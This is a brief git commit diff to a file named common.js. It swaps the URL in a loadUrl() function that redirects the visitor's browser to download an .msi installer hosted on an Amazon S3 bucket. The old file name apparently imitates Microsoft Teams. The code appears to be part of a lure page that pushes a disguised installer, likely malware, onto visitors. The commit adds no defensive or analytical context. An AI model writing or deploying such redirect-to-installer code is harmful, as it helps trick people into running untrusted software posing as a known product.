4eba2f6a75cff1390d792f174b60b0b9e9cdec6d
lucyya258 <t26617663@gmail.com>
2025-07-30 17:01:52 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://tseyt.s3.ap-southeast-2.amazonaws.com/teamss.msi";
+		var url="https://dtteens-new.s3.ap-southeast-2.amazonaws.com/DTTeens-new.msi";
 		window.location=url;
 	}
 }
